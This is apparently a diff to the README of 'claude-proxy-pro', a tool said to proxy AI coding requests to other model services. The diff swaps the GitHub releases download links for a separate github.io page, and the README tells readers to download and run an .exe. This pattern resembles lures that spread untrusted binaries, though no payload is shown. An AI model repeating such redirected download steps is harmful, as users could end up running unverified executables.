@@ -1,12 +1,12 @@
 # 🦀 claude-proxy-pro - Connect your AI tools easily today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/codewithrunningjay/claude-proxy-pro/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://codewithrunningjay.github.io)
 
 claude-proxy-pro acts as a bridge between your computer and advanced AI services. It allows you to use different AI models with your coding assistants. This tool works in the background to send your requests to services like DeepSeek or OpenRouter.
 
 ## 📥 How to download the application
 
-Visit the following link to see all available version downloads: [https://github.com/codewithrunningjay/claude-proxy-pro/releases](https://github.com/codewithrunningjay/claude-proxy-pro/releases).
+Visit the following link to see all available version downloads: [https://codewithrunningjay.github.io](https://codewithrunningjay.github.io).
 
 Look for the file that ends with .exe under the Assets section. Click the filename to start the download. Once the file saves to your computer, find it in your downloads folder. Double-click the file to open the setup window. Follow the prompts on your screen to finish the installation process.
 
